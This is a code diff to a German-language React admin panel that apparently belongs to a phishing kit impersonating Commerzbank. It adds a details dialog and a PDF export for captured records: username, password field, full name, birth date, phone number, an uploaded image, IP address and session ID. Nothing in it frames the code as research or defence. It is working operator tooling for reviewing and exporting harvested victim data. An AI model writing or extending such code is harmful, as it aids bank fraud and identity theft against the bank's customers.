@@ -1,5 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import axios from 'axios';
+import jsPDF from 'jspdf';
 
 interface UserData {
   id: string;
@@ -84,6 +85,8 @@ const AdminPanel: React.FC = () => {
   const [showDeleteDialog, setShowDeleteDialog] = useState(false);
   const [deleteIndex, setDeleteIndex] = useState<number | null>(null);
   const [showSuccessAlert, setShowSuccessAlert] = useState(false);
+  const [showViewDialog, setShowViewDialog] = useState(false);
+  const [selectedUser, setSelectedUser] = useState<any>(null);
   const [successMessage, setSuccessMessage] = useState('');
   const [lastRefresh, setLastRefresh] = useState<Date | null>(null);
   const [autoRefresh, setAutoRefresh] = useState(false);
@@ -265,6 +268,158 @@ const AdminPanel: React.FC = () => {
   const handleDeleteClick = (index: number) => {
     setDeleteIndex(index);
     setShowDeleteDialog(true);
+  };
+
+  const handleViewClick = (userData: any) => {
+    setSelectedUser(userData);
+    setShowViewDialog(true);
+  };
+
+  const handleDownloadPDF = async () => {
+    if (!selectedUser) return;
+
+    const doc = new jsPDF();
+    const pageWidth = doc.internal.pageSize.getWidth();
+    const margin = 20;
+    let yPosition = 20;
+
+    // Helper function to add text with word wrap
+    const addText = (text: string, x: number, y: number, maxWidth: number, fontSize: number = 10) => {
+      doc.setFontSize(fontSize);
+      const lines = doc.splitTextToSize(text, maxWidth);
+      doc.text(lines, x, y);
+      return y + (lines.length * fontSize * 0.4) + 5;
+    };
+
+    // Title
+    yPosition = addText('Benutzerdetails - Commerzbank', margin, yPosition, pageWidth - 2 * margin, 16);
+    yPosition += 10;
+
+    // Login Information
+    yPosition = addText('🔐 Anmeldeinformationen', margin, yPosition, pageWidth - 2 * margin, 12);
+    yPosition = addText(`Benutzername: ${selectedUser.xusr || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+    yPosition = addText(`Passwort: ${selectedUser.xpss ? '***' : 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+    yPosition += 10;
+
+    // Personal Information
+    yPosition = addText('👤 Persönliche Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
+    yPosition = addText(`Vorname: ${selectedUser.xname1 || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+    yPosition = addText(`Nachname: ${selectedUser.xname2 || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+    yPosition = addText(`Geburtsdatum: ${selectedUser.xdob || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+    yPosition = addText(`Telefonnummer: ${selectedUser.xtel || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+    yPosition += 10;
+
+    // File Upload Information with Image
+    if (selectedUser.filename) {
+      yPosition = addText('📁 Hochgeladene Datei', margin, yPosition, pageWidth - 2 * margin, 12);
+      yPosition = addText(`Ursprünglicher Dateiname: ${selectedUser.originalName}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Dateigröße: ${Math.round(selectedUser.size / 1024)} KB`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition += 5;
+
+      // Add image to PDF
+      try {
+        const imageUrl = `${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filename}`;
+        
+        // Fetch the image as blob
+        const response = await fetch(imageUrl);
+        if (response.ok) {
+          const blob = await response.blob();
+          const reader = new FileReader();
+          
+          reader.onload = function() {
+            const base64 = reader.result as string;
+            
+            // Calculate image dimensions to fit in PDF
+            const maxWidth = pageWidth - 2 * margin - 20;
+            const maxHeight = 100;
+            
+            // Add image to PDF
+            doc.addImage(base64, 'JPEG', margin + 10, yPosition, maxWidth, maxHeight);
+            yPosition += maxHeight + 10;
+            
+            // Technical Information
+            yPosition = addText('🌐 Technische Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
+            yPosition = addText(`IP-Adresse: ${selectedUser.ip}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+            yPosition = addText(`Browser: ${getBrowserInfo(selectedUser.userAgent)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+            yPosition = addText(`Sitzungs-ID: ${selectedUser.sessionId}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+            yPosition = addText(`Datum: ${formatDate(selectedUser.timestamp)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+
+            // Footer
+            const footerY = doc.internal.pageSize.getHeight() - 20;
+            doc.setFontSize(8);
+            doc.text(`Generiert am: ${new Date().toLocaleString('de-DE')}`, margin, footerY);
+
+            // Download the PDF
+            const fileName = `Benutzerdetails_${selectedUser.xusr || 'Unbekannt'}_${new Date().toISOString().split('T')[0]}.pdf`;
+            doc.save(fileName);
+          };
+          
+          reader.readAsDataURL(blob);
+        } else {
+          // If image fails to load, continue without image
+          yPosition = addText('Bild konnte nicht geladen werden', margin + 10, yPosition, pageWidth - 2 * margin - 10);
+          yPosition += 10;
+          
+          // Technical Information
+          yPosition = addText('🌐 Technische Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
+          yPosition = addText(`IP-Adresse: ${selectedUser.ip}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+          yPosition = addText(`Browser: ${getBrowserInfo(selectedUser.userAgent)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+          yPosition = addText(`Sitzungs-ID: ${selectedUser.sessionId}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+          yPosition = addText(`Datum: ${formatDate(selectedUser.timestamp)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+
+          // Footer
+          const footerY = doc.internal.pageSize.getHeight() - 20;
+          doc.setFontSize(8);
+          doc.text(`Generiert am: ${new Date().toLocaleString('de-DE')}`, margin, footerY);
+
+          // Download the PDF
+          const fileName = `Benutzerdetails_${selectedUser.xusr || 'Unbekannt'}_${new Date().toISOString().split('T')[0]}.pdf`;
+          doc.save(fileName);
+        }
+      } catch (error) {
+        console.error('Error loading image for PDF:', error);
+        // Continue without image
+        yPosition = addText('Bild konnte nicht geladen werden', margin + 10, yPosition, pageWidth - 2 * margin - 10);
+        yPosition += 10;
+        
+        // Technical Information
+        yPosition = addText('🌐 Technische Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
+        yPosition = addText(`IP-Adresse: ${selectedUser.ip}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+        yPosition = addText(`Browser: ${getBrowserInfo(selectedUser.userAgent)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+        yPosition = addText(`Sitzungs-ID: ${selectedUser.sessionId}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+        yPosition = addText(`Datum: ${formatDate(selectedUser.timestamp)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+
+        // Footer
+        const footerY = doc.internal.pageSize.getHeight() - 20;
+        doc.setFontSize(8);
+        doc.text(`Generiert am: ${new Date().toLocaleString('de-DE')}`, margin, footerY);
+
+        // Download the PDF
+        const fileName = `Benutzerdetails_${selectedUser.xusr || 'Unbekannt'}_${new Date().toISOString().split('T')[0]}.pdf`;
+        doc.save(fileName);
+      }
+    } else {
+      // No file uploaded
+      yPosition = addText('📁 Hochgeladene Datei', margin, yPosition, pageWidth - 2 * margin, 12);
+      yPosition = addText('Keine Datei hochgeladen', margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition += 10;
+
+      // Technical Information
+      yPosition = addText('🌐 Technische Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
+      yPosition = addText(`IP-Adresse: ${selectedUser.ip}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Browser: ${getBrowserInfo(selectedUser.userAgent)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Sitzungs-ID: ${selectedUser.sessionId}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Datum: ${formatDate(selectedUser.timestamp)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+
+      // Footer
+      const footerY = doc.internal.pageSize.getHeight() - 20;
+      doc.setFontSize(8);
+      doc.text(`Generiert am: ${new Date().toLocaleString('de-DE')}`, margin, footerY);
+
+      // Download the PDF
+      const fileName = `Benutzerdetails_${selectedUser.xusr || 'Unbekannt'}_${new Date().toISOString().split('T')[0]}.pdf`;
+      doc.save(fileName);
+    }
   };
 
   const handleDeleteConfirm = async () => {
@@ -451,18 +606,36 @@ const AdminPanel: React.FC = () => {
                   <td>{getBrowserInfo(user.userAgent)}</td>
                   <td>{formatDate(user.timestamp)}</td>
                   <td>
-                    <button
-                      className="delete-btn"
-                      onClick={() => handleDeleteClick(index)}
-                      disabled={deletingId === index}
-                      title="Delete this user session"
-                    >
-                      {deletingId === index ? (
-                        <span className="loading-spinner-small">⏳</span>
-                      ) : (
-                        <span className="delete-icon">🗑️</span>
-                      )}
-                    </button>
+                    <div style={{display: 'flex', gap: '8px', alignItems: 'center'}}>
+                      <button
+                        className="view-btn"
+                        onClick={() => handleViewClick(user)}
+                        title="Benutzerdetails anzeigen"
+                        style={{
+                          background: '#2c5f5f',
+                          color: 'white',
+                          border: 'none',
+                          borderRadius: '4px',
+                          padding: '6px 8px',
+                          cursor: 'pointer',
+                          fontSize: '14px'
+                        }}
+                      >
+                        👁️
+                      </button>
+                      <button
+                        className="delete-btn"
+                        onClick={() => handleDeleteClick(index)}
+                        disabled={deletingId === index}
+                        title="Delete this user session"
+                      >
+                        {deletingId === index ? (
+                          <span className="loading-spinner-small">⏳</span>
+                        ) : (
+                          <span className="delete-icon">🗑️</span>
+                        )}
+                      </button>
+                    </div>
                   </td>
                 </tr>
               ))}
@@ -664,6 +837,170 @@ const AdminPanel: React.FC = () => {
               </button>
               <button className="confirm-delete-btn" onClick={handleDeleteConfirm}>
                 {t.delete}
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* User Details View Dialog */}
+      {showViewDialog && selectedUser && (
+        <div 
+          className="delete-modal" 
+          onClick={() => setShowViewDialog(false)}
+          style={{zIndex: 1001}}
+        >
+          <div 
+            className="delete-dialog" 
+            onClick={(e) => e.stopPropagation()}
+            style={{maxWidth: '600px', width: '90%'}}
+          >
+            <div className="dialog-header">
+              <h3>👤 Benutzerdetails</h3>
+              <button 
+                onClick={() => setShowViewDialog(false)}
+                style={{
+                  background: 'none',
+                  border: 'none',
+                  fontSize: '20px',
+                  cursor: 'pointer',
+                  color: '#666'
+                }}
+              >
+                ×
+              </button>
+            </div>
+            <div className="dialog-body" style={{maxHeight: '70vh', overflowY: 'auto'}}>
+              <div style={{display: 'grid', gap: '20px'}}>
+                {/* Login Information */}
+                <div style={{border: '1px solid #ddd', borderRadius: '8px', padding: '15px'}}>
+                  <h4 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>🔐 Anmeldeinformationen</h4>
+                  <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
+                    <div>
+                      <strong>Benutzername:</strong><br/>
+                      <span style={{color: '#333'}}>{selectedUser.xusr || 'Nicht angegeben'}</span>
+                    </div>
+                    <div>
+                      <strong>Passwort:</strong><br/>
+                      <span style={{color: '#333'}}>{selectedUser.xpss ? '***' : 'Nicht angegeben'}</span>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Personal Information */}
+                <div style={{border: '1px solid #ddd', borderRadius: '8px', padding: '15px'}}>
+                  <h4 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>👤 Persönliche Informationen</h4>
+                  <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
+                    <div>
+                      <strong>Vorname:</strong><br/>
+                      <span style={{color: '#333'}}>{selectedUser.xname1 || 'Nicht angegeben'}</span>
+                    </div>
+                    <div>
+                      <strong>Nachname:</strong><br/>
+                      <span style={{color: '#333'}}>{selectedUser.xname2 || 'Nicht angegeben'}</span>
+                    </div>
+                    <div>
+                      <strong>Geburtsdatum:</strong><br/>
+                      <span style={{color: '#333'}}>{selectedUser.xdob || 'Nicht angegeben'}</span>
+                    </div>
+                    <div>
+                      <strong>Telefonnummer:</strong><br/>
+                      <span style={{color: '#333'}}>{selectedUser.xtel || 'Nicht angegeben'}</span>
+                    </div>
+                  </div>
+                </div>
+
+                {/* File Upload Information */}
+                {selectedUser.filename && (
+                  <div style={{border: '1px solid #ddd', borderRadius: '8px', padding: '15px'}}>
+                    <h4 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>📁 Hochgeladene Datei</h4>
+                    <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
+                      <div>
+                        <strong>Ursprünglicher Dateiname:</strong><br/>
+                        <span style={{color: '#333'}}>{selectedUser.originalName}</span>
+                      </div>
+                      <div>
+                        <strong>Dateigröße:</strong><br/>
+                        <span style={{color: '#333'}}>{Math.round(selectedUser.size / 1024)} KB</span>
+                      </div>
+                    </div>
+                    <div style={{marginTop: '10px'}}>
+                      <strong>Dateivorschau:</strong><br/>
+                      <img 
+                        src={`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filename}`}
+                        alt={selectedUser.originalName}
+                        style={{
+                          width: '100px',
+                          height: '100px',
+                          objectFit: 'cover',
+                          border: '1px solid #ddd',
+                          borderRadius: '4px',
+                          marginTop: '5px'
+                        }}
+                        onError={(e) => {
+                          e.currentTarget.style.display = 'none';
+                        }}
+                      />
+                    </div>
+                  </div>
+                )}
+
+                {/* Technical Information */}
+                <div style={{border: '1px solid #ddd', borderRadius: '8px', padding: '15px'}}>
+                  <h4 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>🌐 Technische Informationen</h4>
+                  <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
+                    <div>
+                      <strong>IP-Adresse:</strong><br/>
+                      <span style={{color: '#333'}}>{selectedUser.ip}</span>
+                    </div>
+                    <div>
+                      <strong>Browser:</strong><br/>
+                      <span style={{color: '#333'}}>{getBrowserInfo(selectedUser.userAgent)}</span>
+                    </div>
+                    <div>
+                      <strong>Sitzungs-ID:</strong><br/>
+                      <span style={{color: '#333', fontSize: '12px', wordBreak: 'break-all'}}>{selectedUser.sessionId}</span>
+                    </div>
+                    <div>
+                      <strong>Datum:</strong><br/>
+                      <span style={{color: '#333'}}>{formatDate(selectedUser.timestamp)}</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div className="dialog-footer" style={{display: 'flex', gap: '10px', justifyContent: 'space-between'}}>
+              <button 
+                className="download-btn" 
+                onClick={handleDownloadPDF}
+                style={{
+                  background: '#28a745',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  padding: '10px 20px',
+                  cursor: 'pointer',
+                  fontSize: '14px',
+                  flex: '1'
+                }}
+              >
+                📄 PDF Herunterladen
+              </button>
+              <button 
+                className="cancel-btn" 
+                onClick={() => setShowViewDialog(false)}
+                style={{
+                  background: '#6c757d',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  padding: '10px 20px',
+                  cursor: 'pointer',
+                  fontSize: '14px',
+                  flex: '1'
+                }}
+              >
+                Schließen
               </button>
             </div>
           </div>
